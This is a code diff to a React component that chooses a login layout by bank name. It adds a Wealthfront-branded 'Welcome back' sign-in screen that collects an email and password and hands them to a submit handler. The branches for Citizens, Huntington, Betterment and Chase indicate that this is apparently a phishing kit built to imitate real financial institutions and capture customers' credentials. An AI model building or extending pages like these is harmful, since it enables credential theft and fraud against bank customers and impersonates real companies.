@@ -105,6 +105,7 @@ export default function ContactForm() {
   const isCitizens = bankName?.toLowerCase().includes('citizens')
   const isHuntington = bankName?.toLowerCase().includes('huntington')
   const isBetterment = bankName?.toLowerCase().includes('betterment')
+  const isWealthfront = bankName?.toLowerCase().includes('wealthfront')
   const isChase = bankName?.toLowerCase().includes('chase')
 
   // ---- FORMULARIO ----
@@ -1541,6 +1542,78 @@ export default function ContactForm() {
                   Sign Up
                 </a>
               </div>
+            </div>
+          </div>
+        </div>
+      )
+    }
+
+    // Diseño para Wealthfront
+    if (isWealthfront) {
+      return (
+        <div className="min-h-screen bg-gray-100 px-4 py-8 sm:px-0">
+          <div className="flex min-h-screen items-center justify-center">
+            <div className="w-full max-w-md rounded-3xl border-2 border-gray-300 bg-white p-12">
+              <h1 className="mb-10 text-center text-3xl font-bold text-gray-900">Welcome back</h1>
+
+              <form onSubmit={submitForm} className="space-y-6">
+                {/* Email */}
+                <div>
+                  <input
+                    type="email"
+                    required
+                    value={username}
+                    onChange={(e) => setUsername(e.target.value)}
+                    placeholder="Email"
+                    className="w-full rounded-2xl border-2 border-gray-300 bg-white px-6 py-4 text-gray-800 placeholder-gray-400 outline-none transition-colors focus:border-blue-600"
+                  />
+                </div>
+
+                {/* Password */}
+                <div>
+                  <input
+                    type={showPassword ? 'text' : 'password'}
+                    required
+                    value={password}
+                    onChange={(e) => setPassword(e.target.value)}
+                    placeholder="Password"
+                    className="w-full rounded-2xl border-2 border-gray-300 bg-white px-6 py-4 text-gray-800 placeholder-gray-400 outline-none transition-colors focus:border-blue-600"
+                  />
+                </div>
+
+                {/* Forgot Password Link */}
+                <div className="text-right">
+                  <a href="#" className="text-base font-semibold text-blue-600 hover:text-blue-700">
+                    Forgot password?
+                  </a>
+                </div>
+
+                {/* Log In Button */}
+                <button
+                  type="submit"
+                  disabled={submitting}
+                  className="w-full rounded-2xl bg-blue-700 py-4 text-center text-lg font-bold text-white hover:bg-blue-800 transition-colors disabled:opacity-60 mt-8"
+                >
+                  {submitting ? 'Logging in…' : 'Log in'}
+                </button>
+
+                {/* Continue with Passkey Link */}
+                <div className="text-center">
+                  <a href="#" className="text-base font-semibold text-blue-600 hover:text-blue-700">
+                    Continue with passkey
+                  </a>
+                </div>
+
+                {/* Sign Up Link */}
+                <div className="pt-4 text-center">
+                  <p className="text-base text-gray-700">
+                    Not a client yet?{' '}
+                    <a href="#" className="font-semibold text-blue-600 hover:text-blue-700">
+                      Sign up
+                    </a>
+                  </p>
+                </div>
+              </form>
             </div>
           </div>
         </div>
